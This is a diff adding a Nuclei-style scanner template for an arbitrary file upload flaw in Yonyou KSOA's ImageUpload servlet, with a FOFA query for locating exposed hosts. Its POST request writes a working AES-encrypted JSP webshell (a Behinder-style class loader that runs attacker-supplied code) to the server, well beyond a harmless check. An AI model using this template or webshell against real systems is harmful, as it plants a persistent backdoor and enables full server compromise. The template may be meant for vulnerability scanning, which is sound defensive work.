@@ -1,0 +1,30 @@
+id: KOSA_ImageUpload_upload
+info:
+  name: 用友时空KSOA ImageUpload文件上传漏洞
+  author: mike
+  severity: info
+  description: 用友时空KSOA平台ImageUpload处存在任意文件上传漏洞，攻击者通过漏洞可以获取服务器权限
+  reference: https://www.cnblogs.com/pursue-security/p/17687951.html
+  metadata:
+    max-request: 1
+    verified: true
+    fofa-query: app="用友-时空KSOA"
+http:
+  - raw:
+      - |
+        POST /servlet/com.sksoft.bill.ImageUpload?filepath=/&filename=mikes.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36
+        Content-Length: 533
+
+        <%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - /pictures/mikes.jsp
+      - type: word
+        part: header
+        words:
+          - '200'
